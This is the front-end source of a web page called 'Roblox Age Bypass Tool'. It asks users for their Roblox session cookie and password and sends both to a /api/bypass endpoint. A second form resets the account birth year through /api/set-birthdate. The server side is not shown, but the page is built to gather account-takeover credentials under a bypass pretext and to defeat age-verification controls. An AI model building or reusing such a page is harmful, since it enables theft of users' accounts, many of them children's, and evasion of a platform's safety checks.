'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';

export default function Home() {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [birthdateYear, setBirthdateYear] = useState('2015');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');

  const handleBypass = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    setError('');

    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, password }),
      });

      const data = await response.json();

      if (data.success) {
        setMessage(`Bypass successful! User ID: ${data.userId}`);
        setCookie('');
        setPassword('');
      } else {
        setError(`Error: ${data.error}`);
      }
    } catch (err) {
      setError(`Error during bypass: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleSetBirthdate = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    setError('');

    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie, year: parseInt(birthdateYear) }),
      });

      const data = await response.json();

      if (data.success) {
        setMessage(`Birthdate changed to ${birthdateYear}!`);
        setCookie('');
      } else {
        setError(`Error: ${data.error}`);
      }
    } catch (err) {
      setError(`Error during birthdate change: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 to-slate-800 p-4">
      <div className="max-w-2xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">Roblox Age Bypass Tool</h1>
          <p className="text-slate-400">Change your account settings</p>
        </div>

        <Tabs defaultValue="bypass" className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="bypass">Execute Bypass</TabsTrigger>
            <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
          </TabsList>

          <TabsContent value="bypass">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Execute Bypass</CardTitle>
                <CardDescription>Enter your credentials to bypass age verification</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleBypass} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">Cookie</label>
                    <Input
                      type="text"
                      placeholder="Enter your Roblox cookie"
                      value={cookie}
                      onChange={(e) => setCookie(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      disabled={loading}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">Password</label>
                    <Input
                      type="password"
                      placeholder="Enter your password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      disabled={loading}
                    />
                  </div>
                  <Button type="submit" disabled={loading} className="w-full">
                    {loading ? 'Processing...' : 'Execute Bypass'}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="birthdate">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Change Birthdate</CardTitle>
                <CardDescription>Set your account birthdate to 2015</CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSetBirthdate} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">Cookie</label>
                    <Input
                      type="text"
                      placeholder="Enter your Roblox cookie"
                      value={cookie}
                      onChange={(e) => setCookie(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      disabled={loading}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">Birth Year</label>
                    <Input
                      type="number"
                      placeholder="2015"
                      value={birthdateYear}
                      onChange={(e) => setBirthdateYear(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      disabled={loading}
                    />
                  </div>
                  <Button type="submit" disabled={loading} className="w-full">
                    {loading ? 'Processing...' : 'Set Birthdate'}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {message && (
          <Card className="mt-6 bg-green-900 border-green-700">
            <CardContent className="pt-6">
              <p className="text-green-100">{message}</p>
            </CardContent>
          </Card>
        )}

        {error && (
          <Card className="mt-6 bg-red-900 border-red-700">
            <CardContent className="pt-6">
              <p className="text-red-100">{error}</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
